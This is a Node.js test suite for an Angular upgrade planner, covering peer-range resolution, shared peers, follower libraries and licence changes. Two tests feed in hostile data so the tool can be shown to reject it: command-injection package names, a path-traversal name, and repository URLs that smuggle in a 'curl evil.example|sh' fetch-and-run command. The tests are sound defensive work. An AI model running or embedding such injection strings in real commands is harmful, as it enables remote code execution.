import assert from 'node:assert/strict';
import { test } from 'node:test';
import { pkg, plan, PLAN, runScript } from './helpers/harness.mjs';
import { app, base, evaIcons, libIn, lockBase, nebular, nebularDeps, nebularLock, nebularWith, world } from './helpers/plan-fixtures.mjs';

// ---- Things npm cannot answer ---------------------------------------------------------------------------------------

test('a library with no Angular peer is reported as unchecked and does not block', async () => {
  const lib = pkg('@syncfusion/ej2-angular-grids', { '35.1.42': { at: '2026-10-27' } });
  const r = await plan(world(lib), app({ deps: { ...base, '@syncfusion/ej2-angular-grids': '*' }, lock: { ...lockBase, '@syncfusion/ej2-angular-grids': '35.1.42' } }));
  assert.equal(r.plan.status, 'ok');
  assert.match(r.plan.unchecked.find((u) => u.name.includes('syncfusion')).reason, /no Angular version/);
});

test('an unrelated package is ignored without noise', async () => {
  const lib = pkg('lodash', { '4.17.21': {} });
  const r = await plan(world(lib), app({ deps: { ...base, lodash: '^4.17.21' }, lock: { ...lockBase, lodash: '4.17.21' } }));
  assert.deepEqual(r.plan.unchecked, []);
  assert.ok(r.plan.hops.every((h) => h.libs.length === 0));
});

test('git, file and workspace dependencies are reported instead of being looked up', async () => {
  const hits = [];
  const r = await plan(world(), app({ deps: { ...base, 'my-lib': 'file:../my-lib', 'other-lib': 'github:me/other-lib' }, lock: lockBase }), { registryOptions: { hits } });
  assert.equal(r.plan.unchecked.length, 2);
  assert.ok(!hits.includes('my-lib'));
});

test('a dependency name that is not a real npm name never reaches a URL or a command', async () => {
  const hits = [];
  const evil = 'evil&calc';
  const r = await plan(world(), app({ deps: { ...base, [evil]: '^1.0.0', '../../etc/passwd': '^1.0.0' }, lock: lockBase }), { registryOptions: { hits } });
  assert.equal(r.code, 0);
  assert.equal(r.plan.unchecked.length, 2);
  assert.ok(r.plan.unchecked.every((u) => /not a valid npm package name/.test(u.reason)));
  assert.ok(!hits.some((h) => h.includes('evil') || h.includes('passwd')));
});

test('an npm: alias is reported, because its name is not the package it installs', async () => {
  const hits = [];
  const r = await plan(world(), app({ deps: { ...base, 'my-alias': 'npm:ui-lib@^1.0.0' }, lock: lockBase }), { registryOptions: { hits } });
  assert.match(r.plan.unchecked[0].reason, /declared as "npm:ui-lib/);
  assert.ok(!hits.includes('my-alias'));
});

test('a package missing from the registry that looks like an Angular one is reported', async () => {
  const r = await plan(world(), app({ deps: { ...base, 'ngx-private-thing': '^1.0.0' }, lock: { ...lockBase, 'ngx-private-thing': '1.0.0' } }));
  assert.match(r.plan.unchecked[0].reason, /not found/);
});

test('eslint packages with no peers follow Angular by major', async () => {
  const lib = pkg('@angular-eslint/schematics', { '20.0.0': { migrations: true }, '21.0.0': { migrations: true }, '22.0.0': { migrations: true } });
  const r = await plan(world(lib), app({ deps: base, devDeps: { '@angular-eslint/schematics': '^20.0.0' }, lock: { ...lockBase, '@angular-eslint/schematics': '20.0.0' } }));
  assert.equal(libIn(r, 22, '@angular-eslint/schematics').to, '22.0.0');
  assert.equal(libIn(r, 22, '@angular-eslint/schematics').support, 'aligned');
});

test('aligned tooling: historical Angular peers do not reject the eligible current line', async () => {
  const lib = pkg('@angular-eslint/builder', {
    '22.1.0': { peers: { '@angular/cli': '>=22.0.0 <23.0.0' } },
    '22.5.0': { peers: { eslint: '^9.0.0 || ^10.0.0', typescript: '*' } },
    '22.6.0': { peers: { eslint: '^9.0.0 || ^10.0.0', typescript: '*' } },
  });
  for (const version of ['22.5.0', '22.6.0']) lib.versions[version].dependencies = { '@angular-devkit/core': '>=22.0.0 <23.0.0', '@angular-devkit/architect': '>=0.2200.0 <0.2300.0' };
  const r = await plan(world(lib), app({ deps: { ...base, '@angular/core': '^21.0.0', '@angular/cli': '^21.0.0' }, devDeps: { '@angular-eslint/builder': '^22.5.0' }, lock: { ...lockBase, '@angular/core': '21.2.0', '@angular-eslint/builder': '22.5.0' } }), { to: 22 });
  assert.equal(r.code, 0, JSON.stringify(r.plan.blockers));
  assert.equal(r.plan.reachable, 22);
  assert.equal(libIn(r, 22, '@angular-eslint/builder').to, '22.6.0');
  assert.equal(libIn(r, 22, '@angular-eslint/builder').support, 'aligned');
  assert.match(r.plan.hops[0].command, /@angular-eslint\/builder@22\.6\.0/);
  assert.doesNotMatch(r.plan.hops[0].command, /--force|--allow-dirty/);
});

test('aligned tooling: obsolete peers do not select an older angular-eslint package group', async () => {
  const group = ['angular-eslint', '@angular-eslint/builder'];
  const eslint = pkg('angular-eslint', {
    '21.4.0': { peers: { '@angular/cli': '>=21.0.0 <22.0.0' }, migrations: true },
    '22.1.0': { peers: { '@angular/cli': '>=22.0.0 <23.0.0', typescript: '*' }, migrations: true },
    '22.6.0': { peers: { typescript: '*' }, migrations: true },
  });
  for (const [version, manifest] of Object.entries(eslint.versions)) { manifest['ng-update'].packageGroup = group; manifest.dependencies = { '@angular-eslint/builder': version }; }
  const builder = pkg('@angular-eslint/builder', { '22.1.0': { peers: { '@angular/cli': '>=22.0.0 <23.0.0' } }, '22.6.0': { peers: { typescript: '*' } } });
  const r = await plan(world(eslint, builder), app({ deps: { ...base, '@angular/core': '^21.0.0', '@angular/cli': '^21.0.0' }, devDeps: { 'angular-eslint': '^21.4.0', '@angular-eslint/builder': '^22.6.0' }, lock: { ...lockBase, '@angular/core': '21.2.0', 'angular-eslint': '21.4.0', '@angular-eslint/builder': '22.6.0' } }), { to: 22 });
  assert.equal(r.code, 0);
  assert.equal(libIn(r, 22, 'angular-eslint').to, '22.6.0');
  assert.equal(libIn(r, 22, '@angular-eslint/builder').to, '22.6.0');
  assert.match(r.plan.hops[0].command, /angular-eslint@22\.6\.0/);
  assert.doesNotMatch(r.plan.hops[0].command, /angular-eslint@22\.1\.0|--force/);
});

test('aligned tooling: explicit peers on eligible releases still block an incompatible major', async () => {
  const lib = pkg('@angular-eslint/builder', { '22.1.0': { peer: '^22.0.0' }, '22.5.0': { peer: '^21.0.0' }, '22.6.0': { peer: '^21.0.0' } });
  const r = await plan(world(lib), app({ deps: { ...base, '@angular/core': '^21.0.0' }, devDeps: { '@angular-eslint/builder': '^22.5.0' }, lock: { ...lockBase, '@angular/core': '21.2.0', '@angular-eslint/builder': '22.5.0' } }), { to: 22 });
  assert.equal(r.code, 2);
  assert.equal(r.plan.blockers[0].name, '@angular-eslint/builder');
  assert.equal(r.plan.hops.length, 0);
});

test('aligned tooling: a higher installed line is not downgraded to infer compatibility', async () => {
  const lib = pkg('@angular-eslint/builder', { '22.1.0': { peer: '^22.0.0' }, '22.6.0': {}, '23.0.0': {} });
  const r = await plan(world(lib), app({ deps: { ...base, '@angular/core': '^21.0.0' }, devDeps: { '@angular-eslint/builder': '^23.0.0' }, lock: { ...lockBase, '@angular/core': '21.2.0', '@angular-eslint/builder': '23.0.0' } }), { to: 22 });
  assert.equal(r.code, 2);
  assert.equal(r.plan.blockers[0].installed, '23.0.0');
  assert.equal(r.plan.hops.length, 0);
});

test('aligned tooling: even a peerless history never selects a release below the installed floor', async () => {
  const lib = pkg('@angular-eslint/builder', { '22.6.0': {}, '23.0.0': {} });
  const r = await plan(world(lib), app({ deps: { ...base, '@angular/core': '^21.0.0' }, devDeps: { '@angular-eslint/builder': '^23.0.0' }, lock: { ...lockBase, '@angular/core': '21.2.0', '@angular-eslint/builder': '23.0.0' } }), { to: 22 });
  assert.equal(libIn(r, 22, '@angular-eslint/builder'), undefined);
  assert.ok(r.plan.unchecked.some((u) => u.name === '@angular-eslint/builder'));
  assert.ok(r.plan.hops.every((h) => !h.command.includes('@angular-eslint/builder@22.6.0')));
});

test('aligned tooling: the rule does not infer support for an ordinary library that lost peers', async () => {
  const lib = pkg('ngx-example-controls', { '21.0.0': { peer: '^21.0.0' }, '22.0.0': {} });
  const r = await plan(world(lib), app({ deps: { ...base, '@angular/core': '^21.0.0', 'ngx-example-controls': '^22.0.0' }, lock: { ...lockBase, '@angular/core': '21.2.0', 'ngx-example-controls': '22.0.0' } }), { to: 22 });
  assert.equal(r.code, 2);
  assert.equal(r.plan.blockers[0].name, 'ngx-example-controls');
});

test('aligned tooling: explicit compatibility still works when there is no target-numbered line', async () => {
  const lib = pkg('@angular-eslint/builder', { '21.0.0': { peer: '^21.0.0 || ^22.0.0' } });
  const r = await plan(world(lib), app({ deps: { ...base, '@angular/core': '^21.0.0' }, devDeps: { '@angular-eslint/builder': '^21.0.0' }, lock: { ...lockBase, '@angular/core': '21.2.0', '@angular-eslint/builder': '21.0.0' } }), { to: 22 });
  assert.equal(r.code, 0);
  assert.equal(libIn(r, 22, '@angular-eslint/builder').to, '21.0.0');
  assert.equal(libIn(r, 22, '@angular-eslint/builder').support, 'declared');
  assert.deepEqual(r.plan.unchecked, []);
});

// ---- Shared peers ------------------------------------------------------------------------------------------------------

test('TypeScript moves the smallest step the major needs', async () => {
  const r = await plan(world(), app({ deps: base, lock: lockBase }));
  assert.deepEqual(r.plan.hops.find((h) => h.major === 21).shared.map((s) => [s.name, s.to]), [['typescript', '5.9.3']]);
  assert.deepEqual(r.plan.hops.find((h) => h.major === 22).shared.map((s) => [s.from, s.to]), [['5.9.3', '6.0.3']], 'each major builds on the last');
});

test('TypeScript that already fits stays put', async () => {
  const r = await plan(world(), app({ deps: base, lock: { ...lockBase, typescript: '5.9.3' } }), { to: 21 });
  assert.deepEqual(r.plan.hops[0].shared, []);
});

test('a library needing an extra package brings it along when the project declares it', async () => {
  const md = pkg('ngx-markdown', { '20.0.0': { peer: '^20.0.0', at: '2025-06-01', peers: { marked: '^15.0.0' } }, '21.0.0': { peer: '^21.0.0', at: '2025-12-01', peers: { marked: '^17.0.0 || ^18.0.0' } } });
  // The registry leaves `repository` out of a package's summary, so the shared line has to read it from the release.
  const repository = { type: 'git', url: 'git+https://github.com/markedjs/marked.git' };
  const marked = pkg('marked', { '15.0.0': { repository }, '17.0.0': { repository }, '17.0.2': { repository }, '18.0.0': { repository } });
  const options = { deps: { ...base, 'ngx-markdown': '^20.0.0', marked: '^15.0.0' }, lock: { ...lockBase, 'ngx-markdown': '20.0.0', marked: '15.0.0' } };
  const r = await plan(world(md, marked), app(options), { to: 21 });
  const line = r.plan.hops[0].shared.find((s) => s.name === 'marked');
  assert.equal(line.to, '17.0.2');
  // On readme-wizard, ng update put marked on 18 where the plan said 17: both fit, and the line says so.
  assert.deepEqual(line.ranges, ['^17.0.0 || ^18.0.0']);
  assert.equal(line.newest, '18.0.0', 'what ng update may install instead');
  const text = await plan(world(md, marked), app(options), { to: 21, text: true });
  assert.match(text.stdout, /marked: 15\.0\.0 -> 17\.0\.2, fits \^17\.0\.0 \|\| \^18\.0\.0; needed by ngx-markdown; repository: https:\/\/github\.com\/markedjs\/marked$/m);
});

test('a license change at the newest release that fits is caught, though the plan picks an older one', async () => {
  // ng update installs the newest release in the peer range, and the skill keeps it, so the plan's own pick can't be
  // the only one compared.
  const md = pkg('ngx-markdown', { '20.0.0': { peer: '^20.0.0', at: '2025-06-01', peers: { marked: '^15.0.0' } }, '21.0.0': { peer: '^21.0.0', at: '2025-12-01', peers: { marked: '^17.0.0 || ^18.0.0' } } });
  const marked = pkg('marked', { '15.0.0': { license: 'MIT' }, '17.0.2': { license: 'MIT' }, '18.0.0': { license: 'BUSL-1.1' } });
  const r = await plan(world(md, marked), app({ deps: { ...base, 'ngx-markdown': '^20.0.0', marked: '^15.0.0' }, lock: { ...lockBase, 'ngx-markdown': '20.0.0', marked: '15.0.0' } }), { to: 21 });
  assert.equal(r.plan.hops[0].shared.find((s) => s.name === 'marked').to, '17.0.2');
  assert.ok(r.plan.licenseChanges.some((c) => c.name === 'marked' && c.to === '18.0.0' && c.after === 'BUSL-1.1'), JSON.stringify(r.plan.licenseChanges));
});

test('a peer two libraries newly need gets a version that fits both, whichever comes first', async () => {
  // The first library's newest fit, 18.0.0, is outside the second one's range, so picking per library contradicted itself.
  const lib = (name, range) => pkg(name, { '20.0.0': { peer: '^20.0.0', at: '2025-06-01' }, '21.0.0': { peers: { '@angular/core': '^21.0.0', 'chart-core': range }, at: '2025-12-01' } });
  const core = pkg('chart-core', { '17.0.2': {}, '18.0.0': {} });
  const options = { deps: { ...base, 'a-chart': '^20.0.0', 'b-chart': '^20.0.0' }, lock: { ...lockBase, 'a-chart': '20.0.0', 'b-chart': '20.0.0' } };
  const r = await plan(world(lib('a-chart', '^17.0.0 || ^18.0.0'), lib('b-chart', '^17.0.0'), core), app(options), { to: 21 });
  assert.deepEqual(r.plan.hops[0].shared.find((s) => s.name === 'chart-core'), { name: 'chart-core', from: null, to: '17.0.2', ranges: ['^17.0.0 || ^18.0.0', '^17.0.0'], neededBy: ['a-chart', 'b-chart'] });

  const apart = await plan(world(lib('a-chart', '^18.0.0'), lib('b-chart', '^17.0.0'), core), app(options), { to: 21 });
  assert.ok(!apart.plan.hops[0].shared.some((s) => s.name === 'chart-core'), 'no version fits both, so none is named');
  assert.ok(apart.plan.unchecked.some((u) => u.name === 'chart-core' && /a-chart and b-chart newly need \^18\.0\.0 and \^17\.0\.0/.test(u.reason)), JSON.stringify(apart.plan.unchecked));
});

test('a library that moves names its repository, where its release notes are when the package has none', async () => {
  const md = pkg('ngx-markdown', {
    '20.0.0': { peer: '^20.0.0', at: '2025-06-01', repository: { type: 'git', url: 'git+https://github.com/jfcere/ngx-markdown.git' } },
    '21.0.0': { peer: '^21.0.0', at: '2025-12-01', repository: { type: 'git', url: 'git+https://github.com/jfcere/ngx-markdown.git' } },
  });
  const options = { deps: { ...base, 'ngx-markdown': '^20.0.0' }, lock: { ...lockBase, 'ngx-markdown': '20.0.0' } };
  assert.equal(libIn(await plan(world(md), app(options), { to: 21 }), 21, 'ngx-markdown').repository, 'https://github.com/jfcere/ngx-markdown');
  assert.match((await plan(world(md), app(options), { to: 21, text: true })).stdout, /ngx-markdown: 20\.0\.0 -> 21\.0\.0;.*; repository: https:\/\/github\.com\/jfcere\/ngx-markdown$/m);

  // The package's author writes this, and an agent may paste it into a shell, so only URL-safe characters get through.
  const hostile = ['javascript:alert(1)', 'https://example.com/a b', 'git+https://github.com/x/y$(curl${IFS}-s${IFS}evil.example|sh).git', "https://github.com/x/y'&&calc&&'", 'https://github.com/x/y\u0001see-instructions', 'https://github.com/x/y​z', `https://github.com/x/${'a'.repeat(300)}`];
  for (const [repository, expected] of [['git://github.com/markedjs/marked.git', 'https://github.com/markedjs/marked'], ['git+ssh://git@github.com/ngrx/platform.git', 'https://github.com/ngrx/platform'], ['https://dev.azure.com/org/project/_git/ui/', 'https://dev.azure.com/org/project/_git/ui/'], ...hostile.map((h) => [h, undefined])]) {
    const lib = pkg('ui-lib', { '20.0.0': { peer: '^20.0.0', at: '2025-06-01' }, '21.0.0': { peer: '^21.0.0', at: '2025-12-01', repository } });
    const r = await plan(world(lib), app({ deps: { ...base, 'ui-lib': '^20.0.0' }, lock: { ...lockBase, 'ui-lib': '20.0.0' } }), { to: 21 });
    assert.equal(libIn(r, 21, 'ui-lib').repository, expected, repository);
  }
});

test('a file angular.json loads that the next release no longer ships is named under that major', async () => {
  // marked 16 stopped shipping marked.min.js, which readme-wizard loaded from angular.json, and only the build said so.
  const md = pkg('ngx-markdown', { '20.0.0': { peer: '^20.0.0', at: '2025-06-01', peers: { marked: '^15.0.0' } }, '21.0.0': { peer: '^21.0.0', at: '2025-12-01', peers: { marked: '^17.0.0' } } });
  const marked = pkg('marked', { '15.0.0': { files: { 'marked.min.js': 'x', 'lib/marked.umd.js': 'x' } }, '17.0.2': { files: { 'lib/marked.umd.js': 'x' } } });
  const scripts = ['node_modules/marked/marked.min.js', 'node_modules/marked/lib/marked.umd.js'];
  const files = { 'angular.json': JSON.stringify({ projects: { app: { architect: { build: { options: { scripts, styles: ['src/styles.css'] } } } } } }) };
  const options = { deps: { ...base, 'ngx-markdown': '^20.0.0', marked: '^15.0.0' }, lock: { ...lockBase, 'ngx-markdown': '20.0.0', marked: '15.0.0' }, files };
  const r = await plan(world(md, marked), app(options), { to: 21 });
  assert.deepEqual(r.plan.hops[0].dropped, [{ file: 'node_modules/marked/marked.min.js', name: 'marked', version: '17.0.2' }]);
  const text = await plan(world(md, marked), app(options), { to: 21, text: true });
  assert.match(text.stdout, /angular\.json: loads node_modules\/marked\/marked\.min\.js, which marked 17\.0\.2 no longer ships/);
});

test('a file the next release still ships is not named, even on a path long enough for the tarball\'s prefix field', async () => {
  const deep = `${'a'.repeat(60)}/${'b'.repeat(60)}/theme.css`;
  const ui = pkg('ui-lib', { '20.0.0': { peer: '^20.0.0', at: '2025-06-01', files: { [deep]: 'x' } }, '21.0.0': { peer: '^21.0.0', at: '2025-12-01', files: { [deep]: 'x' } } });
  const styles = [{ input: `node_modules/ui-lib/${deep}`, bundleName: 'theme' }];
  const files = { 'angular.json': JSON.stringify({ projects: { app: { architect: { build: { configurations: { production: { styles } } } } } } }) };
  const options = { deps: { ...base, 'ui-lib': '^20.0.0' }, lock: { ...lockBase, 'ui-lib': '20.0.0' }, files };
  const r = await plan(world(ui), app(options), { to: 21 });
  assert.deepEqual(r.plan.hops[0].dropped, []);
  assert.deepEqual(r.plan.unchecked, []);

  const unreadable = pkg('ui-lib', { '20.0.0': { peer: '^20.0.0', at: '2025-06-01' }, '21.0.0': { peer: '^21.0.0', at: '2025-12-01', files: 'corrupt' } });
  const u = await plan(world(unreadable), app(options), { to: 21 });
  assert.ok(u.plan.unchecked.some((x) => x.name === 'ui-lib' && /angular\.json/.test(x.reason)), 'a release it could not read is said, not passed over');
});

test('an extra package the project does not declare is left for npm to install', async () => {
  const md = pkg('ngx-markdown', { '20.0.0': { peer: '^20.0.0', at: '2025-06-01', peers: { marked: '^15.0.0' } }, '21.0.0': { peer: '^21.0.0', at: '2025-12-01', peers: { marked: '^17.0.0' } } });
  const r = await plan(world(md), app({ deps: { ...base, 'ngx-markdown': '^20.0.0' }, lock: { ...lockBase, 'ngx-markdown': '20.0.0' } }), { to: 21 });
  assert.equal(r.plan.status, 'ok');
  assert.ok(!r.plan.hops[0].shared.some((s) => s.name === 'marked'));
});

test('an optional peer the project does not declare is ignored', async () => {
  const lib = pkg('ui-lib', { '20.0.0': { peer: '^20.0.0', at: '2025-06-01' }, '21.0.0': { peer: '^21.0.0', at: '2025-12-01', peers: { 'not-installed': '^9.0.0' } } });
  lib.versions['21.0.0'].peerDependenciesMeta = { 'not-installed': { optional: true } };
  const r = await plan(world(lib), app({ deps: { ...base, 'ui-lib': '^20.0.0' }, lock: { ...lockBase, 'ui-lib': '20.0.0' } }), { to: 21 });
  assert.equal(r.plan.status, 'ok');
});

test('two libraries wanting incompatible TypeScript block the major with both named', async () => {
  const fire = pkg('@angular/fire', { '20.0.0': { peer: '^20.0.0', at: '2025-06-01' }, '21.0.0': { peer: '^21.0.0', at: '2025-12-01', peers: { typescript: '>=5.8 <5.9' } } });
  const r = await plan(world(fire), app({ deps: { ...base, '@angular/fire': '^20.0.0' }, lock: { ...lockBase, '@angular/fire': '20.0.0' } }), { to: 21 });
  assert.equal(r.code, 2);
  const b = r.plan.blockers[0];
  assert.equal(b.kind, 'peer-conflict');
  assert.equal(b.name, 'typescript');
  assert.match(b.reason, /@angular\/fire wants >=5.8 <5.9/);
  assert.match(b.reason, /@angular\/compiler-cli wants/);
});

test('sibling libraries whose chosen versions disagree block instead of breaking at install time', async () => {
  const store = pkg('@ngrx/store', { '20.0.0': { peer: '^20.0.0', at: '2025-06-01' }, '21.0.0': { peer: '^21.0.0', at: '2025-12-01' } });
  const effects = pkg('@ngrx/effects', { '20.0.0': { peer: '^20.0.0', at: '2025-06-01', peers: { '@ngrx/store': '20.0.0' } }, '21.0.1': { peer: '^21.0.0', at: '2025-12-02', peers: { '@ngrx/store': '21.0.1' } } });
  const r = await plan(world(store, effects), app({ deps: { ...base, '@ngrx/store': '^20.0.0', '@ngrx/effects': '^20.0.0' }, lock: { ...lockBase, '@ngrx/store': '20.0.0', '@ngrx/effects': '20.0.0' } }), { to: 21 });
  assert.equal(r.plan.blockers[0].kind, 'peer-conflict');
  assert.equal(r.plan.blockers[0].name, '@ngrx/store');
});

const cdk = () => pkg('@angular/cdk', { '20.2.14': { peer: '^20.0.0 || ^21.0.0', at: '2025-11-01' }, '21.2.14': { peer: '^21.0.0 || ^22.0.0', at: '2026-05-01' } });

const cdkApp = () => app({ deps: { ...base, '@angular/cdk': '20.2.14', '@nebular/theme': '16.0.0' }, lock: { ...lockBase, '@angular/cdk': '20.2.14', '@nebular/theme': '16.0.0' } });

test('a library that could have stayed moves when a sibling needs it newer', async () => {
  const r = await plan(world(cdk(), nebular()), cdkApp(), { to: 21 });
  assert.equal(r.code, 0, JSON.stringify(r.plan?.blockers));
  assert.equal(r.plan.status, 'ok');
  assert.equal(libIn(r, 21, '@angular/cdk').to, '21.2.14');
  assert.equal(libIn(r, 21, '@nebular/theme').to, '17.0.0');
  assert.match(r.plan.hops[0].command, /@angular\/cdk@21\.2\.14/);
});

test('that move still leaves the real blocker at the next major', async () => {
  const r = await plan(world(cdk(), nebular()), cdkApp());
  assert.equal(r.plan.reachable, 21);
  assert.equal(r.plan.blockedAt, 22);
  assert.deepEqual(r.plan.blockers.map((b) => b.name), ['@nebular/theme']);
});

test('a chain of siblings follows through, and an old release stops counting once it moves', async () => {
  const lib = pkg('needs-lib', { '20.0.0': { peer: '^20.0.0', at: '2025-06-01', peers: { 'shared-lib': '^1.0.0' } }, '21.0.0': { peer: '^21.0.0', at: '2025-12-01', peers: { 'shared-lib': '^2.0.0' } } });
  const shared = pkg('shared-lib', {
    '1.0.0': { peer: '^20.0.0 || ^21.0.0', at: '2025-06-01', peers: { 'third-lib': '^1.0.0' } },
    '2.0.0': { peer: '^20.0.0 || ^21.0.0', at: '2025-12-01', peers: { 'third-lib': '^2.0.0' } },
  });
  const third = pkg('third-lib', { '1.0.0': { peer: '^20.0.0 || ^21.0.0', at: '2025-06-01' }, '2.0.0': { peer: '^20.0.0 || ^21.0.0', at: '2025-12-01' } });
  const versions = { 'needs-lib': '20.0.0', 'shared-lib': '1.0.0', 'third-lib': '1.0.0' };
  const r = await plan(world(lib, shared, third), app({ deps: { ...base, ...versions }, lock: { ...lockBase, ...versions } }), { to: 21 });
  assert.equal(r.code, 0, JSON.stringify(r.plan?.blockers));
  assert.equal(libIn(r, 21, 'shared-lib').to, '2.0.0');
  assert.equal(libIn(r, 21, 'third-lib').to, '2.0.0');
});

test('when no release of the sibling can satisfy it, that is a real conflict', async () => {
  const fussy = pkg('fussy', { '1.0.0': { peer: '^20.0.0', at: '2025-06-01' }, '2.0.0': { peer: '^21.0.0', at: '2025-12-01', peers: { '@angular/cdk': '>=21.5.0 <22.0.0' } } });
  const r = await plan(world(cdk(), fussy), app({ deps: { ...base, '@angular/cdk': '20.2.14', fussy: '1.0.0' }, lock: { ...lockBase, '@angular/cdk': '20.2.14', fussy: '1.0.0' } }), { to: 21 });
  assert.equal(r.code, 2);
  assert.equal(r.plan.blockers[0].kind, 'peer-conflict');
  assert.equal(r.plan.blockers[0].name, '@angular/cdk');
});

test('--help prints usage instead of a stack trace', async () => {
  const r = await runScript(PLAN, ['--help']);
  assert.equal(r.code, 0);
  assert.match(r.stdout, /Usage:/);
});

test('an unknown option says so in one line', async () => {
  const r = await runScript(PLAN, ['--nope']);
  assert.equal(r.code, 1);
  assert.match(r.stderr, /--nope/);
  assert.doesNotMatch(r.stderr, /\n\s+at /);
});

test('sibling libraries that agree pass', async () => {
  const store = pkg('@ngrx/store', { '20.0.0': { peer: '^20.0.0', at: '2025-06-01' }, '21.0.1': { peer: '^21.0.0', at: '2025-12-01' } });
  const effects = pkg('@ngrx/effects', { '20.0.0': { peer: '^20.0.0', at: '2025-06-01', peers: { '@ngrx/store': '20.0.0' } }, '21.0.1': { peer: '^21.0.0', at: '2025-12-02', peers: { '@ngrx/store': '21.0.1' } } });
  const r = await plan(world(store, effects), app({ deps: { ...base, '@ngrx/store': '^20.0.0', '@ngrx/effects': '^20.0.0' }, lock: { ...lockBase, '@ngrx/store': '20.0.0', '@ngrx/effects': '20.0.0' } }), { to: 21 });
  assert.equal(r.plan.status, 'ok');
  assert.match(r.plan.hops[0].command, /@ngrx\/effects@21\.0\.1/);
  assert.match(r.plan.hops[0].command, /@ngrx\/store@21\.0\.1/);
});

// ---- Libraries tied to a moving library by a peer, with no Angular peer of their own --------------------------------

test('a library pinned to one that moves goes in the same command, though it has no Angular peer', async () => {
  const r = await plan(world(...nebularWith({ ...evaIcons('16.0.0', '16.0.0'), ...evaIcons('17.0.0', '17.0.0') })), app({ deps: nebularDeps, lock: nebularLock }), { to: 21 });
  assert.equal(r.code, 0, r.stderr);
  const lib = libIn(r, 21, '@nebular/eva-icons');
  assert.equal(lib.from, '16.0.0');
  assert.equal(lib.to, '17.0.0');
  assert.equal(lib.support, 'follows');
  assert.ok(r.plan.hops[0].command.includes('@nebular/eva-icons@17.0.0'));
  assert.ok(r.plan.hops[0].command.includes('@nebular/theme@17.0.0'));
});

test('the printed plan says why a follower moves', async () => {
  const r = await plan(world(...nebularWith({ ...evaIcons('16.0.0', '16.0.0'), ...evaIcons('17.0.0', '17.0.0') })), app({ deps: nebularDeps, lock: nebularLock }), { to: 21, text: true });
  assert.match(r.stdout, /@nebular\/eva-icons: 16\.0\.0 -> 17\.0\.0; moves with its peer \(@nebular\/theme 17\.0\.0\)/);
});

test('a follower whose range still accepts the new version stays put', async () => {
  const r = await plan(world(...nebularWith(evaIcons('16.0.0', '>=16.0.0'))), app({ deps: nebularDeps, lock: nebularLock }), { to: 21 });
  assert.equal(r.code, 0, r.stderr);
  assert.equal(libIn(r, 21, '@nebular/eva-icons'), undefined);
  assert.ok(!r.plan.hops[0].command.includes('eva-icons'));
});

test('a follower with no release for the new version is a blocker, not a command ng update would refuse', async () => {
  const r = await plan(world(...nebularWith(evaIcons('16.0.0', '16.0.0'))), app({ deps: nebularDeps, lock: nebularLock }), { to: 21 });
  assert.equal(r.code, 2);
  assert.equal(r.plan.reachable, 20);
  const blocker = r.plan.blockers.find((b) => b.name === '@nebular/eva-icons');
  assert.equal(blocker.major, 21);
  assert.match(blocker.reason, /@nebular\/theme 17\.0\.0/);
  assert.match(blocker.reason, /requires 16\.0\.0/);
});

test('a follower never moves backwards to find a range that fits', async () => {
  const icons = { ...evaIcons('15.0.0', '>=16.0.0'), ...evaIcons('16.0.0', '16.0.0') };
  const r = await plan(world(...nebularWith(icons)), app({ deps: nebularDeps, lock: nebularLock }), { to: 21 });
  assert.equal(r.code, 2);
  assert.ok(r.plan.blockers.some((b) => b.name === '@nebular/eva-icons'));
});

test('a deprecated release is not a way out for a follower', async () => {
  const icons = { ...evaIcons('16.0.0', '16.0.0'), '17.0.0': { peers: { '@nebular/theme': '17.0.0' }, deprecated: 'do not use' } };
  const r = await plan(world(...nebularWith(icons)), app({ deps: nebularDeps, lock: nebularLock }), { to: 21 });
  assert.equal(r.code, 2);
  assert.ok(r.plan.blockers.some((b) => b.name === '@nebular/eva-icons'));
});

test('a follower of a follower moves too', async () => {
  const extra = pkg('eva-extras', { '1.0.0': { peers: { '@nebular/eva-icons': '16.0.0' } }, '2.0.0': { peers: { '@nebular/eva-icons': '17.0.0' } } });
  const r = await plan(world(...nebularWith({ ...evaIcons('16.0.0', '16.0.0'), ...evaIcons('17.0.0', '17.0.0') }), extra), app({ deps: { ...nebularDeps, 'eva-extras': '1.0.0' }, lock: { ...nebularLock, 'eva-extras': '1.0.0' } }), { to: 21 });
  assert.equal(r.code, 0, r.stderr);
  assert.equal(libIn(r, 21, 'eva-extras').to, '2.0.0');
  assert.ok(r.plan.hops[0].command.includes('eva-extras@2.0.0'));
});

test('a plain dependency with no tie to a moving library is left out', async () => {
  const r = await plan(world(...nebularWith({ ...evaIcons('16.0.0', '16.0.0'), ...evaIcons('17.0.0', '17.0.0') }), pkg('lodash', { '4.17.21': {}, '5.0.0': {} })), app({ deps: { ...nebularDeps, lodash: '4.17.21' }, lock: { ...nebularLock, lodash: '4.17.21' } }), { to: 21 });
  assert.equal(libIn(r, 21, 'lodash'), undefined);
  assert.ok(!r.plan.hops[0].command.includes('lodash'));
});
